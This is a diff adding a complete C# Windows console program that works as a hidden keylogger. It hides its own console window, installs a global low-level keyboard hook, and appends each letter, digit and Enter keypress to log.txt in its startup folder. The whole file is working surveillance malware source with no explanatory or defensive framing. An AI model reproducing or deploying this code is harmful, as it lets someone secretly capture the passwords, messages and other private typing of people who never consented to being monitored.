@@ -1,0 +1,167 @@
+﻿using System;
+using System.Diagnostics;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
+using System.IO;
+
+namespace ConsoleTeste
+{
+  class Program
+  {
+    private const int WH_KEYBOARD_LL = 13;
+    private const int WM_KEYDOWN = 0x0100;
+    private static LowLevelKeyboardProc _proc = HookCallback;
+    private static IntPtr _hookID = IntPtr.Zero;
+    //private static KeysConverter kc = new KeysConverter();
+
+    static void Main(string[] args)
+    {
+      var handle = GetConsoleWindow();
+
+      // Hide
+      ShowWindow(handle, SW_HIDE);
+
+      _hookID = SetHook(_proc);
+      Application.Run();
+      UnhookWindowsHookEx(_hookID);
+    }
+
+    private static IntPtr SetHook(LowLevelKeyboardProc proc)
+    {
+      using (Process curProcess = Process.GetCurrentProcess())
+      using (ProcessModule curModule = curProcess.MainModule)
+      {
+        return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
+            GetModuleHandle(curModule.ModuleName), 0);
+      }
+    }
+
+    private delegate IntPtr LowLevelKeyboardProc(
+       int nCode, IntPtr wParam, IntPtr lParam);
+
+    private static IntPtr HookCallback(
+        int nCode, IntPtr wParam, IntPtr lParam)
+    {
+      if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+      {
+        int vkCode = Marshal.ReadInt32(lParam);
+        Console.WriteLine((Keys)vkCode);
+        StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
+
+        if ((Keys)vkCode == Keys.Enter)
+        { sw.Write(Environment.NewLine); }
+        else if (IsValidKey((Keys)vkCode))
+        {
+          sw.Write(ConvertKeyValue( (Keys)vkCode));
+        }
+        sw.Close();
+      }
+      return CallNextHookEx(_hookID, nCode, wParam, lParam);
+    }
+
+    static string ConvertKeyValue(Keys key) 
+    {
+      switch (key)
+      {
+        case (Keys.D0): return "0";
+        case (Keys.D1): return "1";
+        case (Keys.D2): return "2";
+        case (Keys.D3): return "3";
+        case (Keys.D4): return "4";
+        case (Keys.D5): return "5";
+        case (Keys.D6): return "6";
+        case (Keys.D7): return "7";
+        case (Keys.D8): return "8";
+        case (Keys.D9): return "9";
+        case (Keys.NumPad0): return "0";
+        case (Keys.NumPad1): return "1";
+        case (Keys.NumPad2): return "2";
+        case (Keys.NumPad3): return "3";
+        case (Keys.NumPad4): return "4";
+        case (Keys.NumPad5): return "5";
+        case (Keys.NumPad6): return "6";
+        case (Keys.NumPad7): return "7";
+        case (Keys.NumPad8): return "8";
+        case (Keys.NumPad9): return "9";
+        default: return key.ToString();
+      }
+    }
+
+    static bool IsValidKey(Keys key)
+    {
+      switch (key)
+      {
+        case (Keys.D0): return true;
+        case (Keys.D1): return true;
+        case (Keys.D2): return true;
+        case (Keys.D3): return true;
+        case (Keys.D4): return true;
+        case (Keys.D5): return true;
+        case (Keys.D6): return true;
+        case (Keys.D7): return true;
+        case (Keys.D8): return true;
+        case (Keys.D9): return true;
+        case (Keys.NumPad0): return true;
+        case (Keys.NumPad1): return true;
+        case (Keys.NumPad2): return true;
+        case (Keys.NumPad3): return true;
+        case (Keys.NumPad4): return true;
+        case (Keys.NumPad5): return true;
+        case (Keys.NumPad6): return true;
+        case (Keys.NumPad7): return true;
+        case (Keys.NumPad8): return true;
+        case (Keys.NumPad9): return true;
+        case (Keys.A): return true;
+        case (Keys.B): return true;
+        case (Keys.C): return true;
+        case (Keys.D): return true;
+        case (Keys.E): return true;
+        case (Keys.F): return true;
+        case (Keys.G): return true;
+        case (Keys.H): return true;
+        case (Keys.I): return true;
+        case (Keys.J): return true;
+        case (Keys.K): return true;
+        case (Keys.L): return true;
+        case (Keys.M): return true;
+        case (Keys.N): return true;
+        case (Keys.O): return true;
+        case (Keys.P): return true;
+        case (Keys.Q): return true;
+        case (Keys.R): return true;
+        case (Keys.S): return true;
+        case (Keys.T): return true;
+        case (Keys.U): return true;
+        case (Keys.V): return true;
+        case (Keys.W): return true;
+        case (Keys.X): return true;
+        case (Keys.Y): return true;
+        case (Keys.Z): return true;
+        default: return false;
+      }
+    }
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr SetWindowsHookEx(int idHook,
+        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
+        IntPtr wParam, IntPtr lParam);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetConsoleWindow();
+
+    [DllImport("user32.dll")]
+    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+    const int SW_HIDE = 0;
+  }
+}
